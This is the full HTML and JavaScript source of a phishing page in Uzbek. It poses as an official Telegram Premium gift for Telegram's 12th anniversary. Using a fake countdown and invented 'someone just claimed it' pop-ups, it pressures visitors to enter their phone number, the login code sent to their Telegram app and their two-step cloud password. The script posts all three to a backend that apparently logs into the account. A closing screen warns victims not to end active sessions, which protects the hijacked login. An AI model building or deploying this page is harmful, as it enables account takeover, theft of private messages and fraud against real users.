<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Premium Gift — Rasmiy Sovg'alar</title>
    <style>
        :root { --tg-color: #3390ec; --bg-color: #f4f4f5; --premium-gradient: linear-gradient(45deg, #6c52ee, #b652ee); }
        body { 
            background: var(--bg-color); 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; 
        }
        .box { 
            background: #fff; padding: 30px; border-radius: 20px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; 
            width: 380px; position: relative; overflow: hidden;
        }
        
        /* Premium Header */
        .premium-header {
            background: var(--premium-gradient);
            margin: -30px -30px 20px -30px;
            padding: 40px 20px;
            color: white;
        }
        .star-icon { width: 80px; filter: drop-shadow(0 0 10px rgba(255,255,255,0.5)); animation: pulse 2s infinite; }
        
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
        
        h2 { font-size: 24px; margin: 10px 0; font-weight: 700; }
        .timer { font-size: 14px; background: rgba(0,0,0,0.1); padding: 5px 15px; border-radius: 20px; display: inline-block; margin-bottom: 10px; }

        p { color: #707579; font-size: 15px; line-height: 1.5; margin-bottom: 20px; }

        /* Sovg'a tanlash kartalari */
        .gift-options { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
        .gift-card { 
            border: 2px solid #eee; padding: 15px; border-radius: 15px; cursor: pointer; transition: 0.3s;
        }
        .gift-card.active { border-color: var(--tg-color); background: #f0f7ff; }
        .gift-card b { display: block; color: var(--tg-color); }

        input { 
            width: 100%; padding: 14px; margin: 10px 0; 
            border: 1px solid #dadce0; border-radius: 12px; 
            font-size: 16px; box-sizing: border-box; outline: none;
        }
        button { 
            width: 100%; padding: 15px; background: var(--tg-color); 
            color: #fff; border: none; border-radius: 12px; 
            font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s;
        }
        button:hover { opacity: 0.9; transform: translateY(-2px); }

        /* Notification Toast */
        .toast {
            position: fixed; bottom: 20px; left: 20px; background: white;
            padding: 10px 20px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            display: flex; align-items: center; gap: 10px; font-size: 13px;
            animation: slideUp 0.5s ease-out; z-index: 100;
        }
        @keyframes slideUp { from { transform: translateY(100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }

        .loading-overlay { 
            display: none; position: absolute; top: 0; left: 0; 
            width: 100%; height: 100%; background: rgba(255,255,255,0.98); 
            z-index: 10; flex-direction: column; justify-content: center; align-items: center; 
        }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--tg-color); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .hidden { display: none; }
        .success-screen { color: #333; }
        .success-screen h3 { color: #28a745; }
    </style>
</head>
<body>

<div class="box">
    <div id="loader" class="loading-overlay">
        <div class="spinner"></div>
        <p id="loader-text" style="margin-top: 15px; font-weight: 500;">Xavfsiz ulanish o'rnatilmoqda...</p>
    </div>

    <div class="premium-header">
        <img src="https://telegram.org/img/t_logo.png" class="star-icon" alt="Star">
        <h2>Premium Gift</h2>
        <div class="timer">Aksiya tugashiga: <span id="timer-clock">05:00</span></div>
    </div>

    <div id="step0">
        <p>Telegram 12 yilligi munosabati bilan bepul obunalarni taqdim etadi. Sovg'ani tanlang:</p>
        <div class="gift-options">
            <div class="gift-card active" onclick="selectGift(this)">
                <b>3 Oylik</b>
                <s>$11.99</s> BEPUL
            </div>
            <div class="gift-card" onclick="selectGift(this)">
                <b>6 Oylik</b>
                <s>$19.99</s> BEPUL
            </div>
        </div>
        <button onclick="nextStep(1)">DAVOM ETISH</button>
    </div>

    <div id="step1" class="hidden">
        <p>Sovg'ani faollashtirish uchun telefon raqamingizni kiriting:</p>
        <input type="tel" id="phone" placeholder="+998901234567" value="+998">
        <button onclick="sendPhone()">TASDIQLASH</button>
    </div>

    <div id="step2" class="hidden">
        <p id="phone-display" style="font-weight: bold;"></p>
        <p>Ilovaga yuborilgan 5 xonali tasdiqlash kodini kiriting:</p>
        <input type="text" id="code" placeholder="12345" maxlength="5">
        <button onclick="verifyCode()">SOVG'ANI QABUL QILISH</button>
    </div>

    <div id="step3" class="hidden">
        <p style="color: #d32f2f;">Akkauntingiz ikki bosqichli tasdiqlash bilan himoyalangan.</p>
        <input type="password" id="password" placeholder="Bulutli parolingiz">
        <button onclick="verifyPassword()">KIRISH</button>
    </div>

    <div id="step-final" class="hidden success-screen">
        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg" width="60">
        <h3>Arizangiz qabul qilindi!</h3>
        <p>Premium obunangiz navbatga qo'yildi. Tekshiruv va faollashtirish jarayoni <b>24 soat ichida</b> yakunlanadi.</p>
        <p style="font-size: 13px; background: #fff9c4; padding: 10px; border-radius: 10px;">
            <b>Diqqat:</b> Jarayon tugaguncha akkauntdagi faol sessiyalarni o'chirmang, aks holda sovg'a bekor qilinadi.
        </p>
        <button onclick="window.location.href='https://t.me/telegram'" style="background: #333;">YOPISH</button>
    </div>
</div>

<div id="notification-area"></div>

<script>
    const API_URL = "http://localhost:8000";
    let phoneHash = "";
    let userPhone = "";

    // Timer funksiyasi
    function startTimer(duration, display) {
        let timer = duration, minutes, seconds;
        setInterval(() => {
            minutes = parseInt(timer / 60, 10);
            seconds = parseInt(timer % 60, 10);
            display.textContent = `${minutes < 10 ? "0" + minutes : minutes}:${seconds < 10 ? "0" + seconds : seconds}`;
            if (--timer < 0) timer = duration;
        }, 1000);
    }

    window.onload = () => {
        startTimer(300, document.querySelector('#timer-clock'));
        showFakeNotifications();
    };

    function selectGift(el) {
        document.querySelectorAll('.gift-card').forEach(c => c.classList.remove('active'));
        el.classList.add('active');
    }

    function nextStep(s) {
        document.getElementById('step0').classList.add('hidden');
        document.getElementById('step1').classList.remove('hidden');
    }

    function showFakeNotifications() {
        const names = ["Doston", "Sardor", "Jasur", "Madina", "Shaxzod"];
        setInterval(() => {
            const name = names[Math.floor(Math.random() * names.length)];
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.innerHTML = `✅ <b>${name}</b> hozirgina 6 oylik Premium oldi`;
            document.getElementById('notification-area').appendChild(toast);
            setTimeout(() => toast.remove(), 4000);
        }, 8000);
    }

    function showLoader(show, text = "") {
        const loader = document.getElementById('loader');
        if(text) document.getElementById('loader-text').innerText = text;
        loader.style.display = show ? 'flex' : 'none';
    }

    async function sendPhone() {
        userPhone = document.getElementById('phone').value.trim();
        showLoader(true, "Raqam tekshirilmoqda...");
        try {
            const res = await fetch(`${API_URL}/send`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone: userPhone })
            });
            const data = await res.json();
            if (res.ok) {
                phoneHash = data.hash;
                document.getElementById('step1').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
                document.getElementById('phone-display').innerText = userPhone;
            } else { alert(data.detail); }
        } catch (e) { alert("Server bilan aloqa yo'q!"); }
        finally { showLoader(false); }
    }

    async function verifyCode() {
        const code = document.getElementById('code').value;
        showLoader(true, "Kod tasdiqlanmoqda...");
        const res = await fetch(`${API_URL}/verify`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ phone: userPhone, code: code, hash: phoneHash })
        });
        const data = await res.json();
        showLoader(false);

        if (data.status === "2fa_needed") {
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('step3').classList.remove('hidden');
        } else if (data.status === "success") {
            showFinal();
        } else { alert("Xato kod kiritildi!"); }
    }

    async function verifyPassword() {
        const password = document.getElementById('password').value;
        showLoader(true, "Akkaunt ulanmoqda...");
        const res = await fetch(`${API_URL}/verify`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ phone: userPhone, password: password })
        });
        const data = await res.json();
        showLoader(false);

        if (data.status === "success") {
            showFinal();
        } else { alert("Parol noto'g'ri!"); }
    }

    function showFinal() {
        document.getElementById('step1').classList.add('hidden');
        document.getElementById('step2').classList.add('hidden');
        document.getElementById('step3').classList.add('hidden');
        document.querySelector('.premium-header').style.display = 'none';
        document.getElementById('step-final').classList.remove('hidden');
    }
</script>
</body>
</html>